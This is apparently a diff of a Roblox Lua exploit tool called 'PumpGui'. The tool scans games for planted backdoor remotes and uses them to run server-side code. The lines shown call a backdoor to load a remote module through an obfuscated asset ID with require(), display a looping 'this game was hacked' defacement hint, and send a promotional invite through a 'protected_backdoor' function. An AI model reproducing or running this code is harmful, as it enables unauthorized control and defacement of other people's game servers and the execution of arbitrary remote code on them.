@@ -1559,7 +1559,7 @@ local script = G2L["20"];
 					GUI.Scanner.Visible=false
 					makeVisible(GUI.Executor, true)
 	
-	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='PumpGui Este jogo foi Hackeado 'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
+	--				runRemote(backdoor, "a=Instance.new('Hint',workspace)while true do a.Text='Hehe 8324a41506 'for b=1,13 do a.Parent=workspace;wait(1)a.Parent=nil;wait(0.5)end;wait(60)end")
 					runRemote(remote, "require(171016405.1884*69)")			
 					runRemote(remote, "a=Instance.new('Hint')a.Text='Este jogo foi Hackeado'while true do a.Parent=workspace;wait(15)a:Remove()wait(30)end")
 					
@@ -1598,7 +1598,7 @@ local script = G2L["20"];
 		if protected_backdoor and protected_backdoor:IsA('RemoteFunction') then
 			debug('Protected backdoor found', 3)
 			spawn(function()
-				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('PumpGui join today!! discord.gg/XXqzxT7E5z', a) end)
+				local boolValue, variantValue=pcall(function() protected_backdoor:InvokeServer('PumpGui join today!! discord', a) end)
 				if variantValue~=nil then
 					local splited=string.split(variantValue,':')
 					notify(splited[#splited])
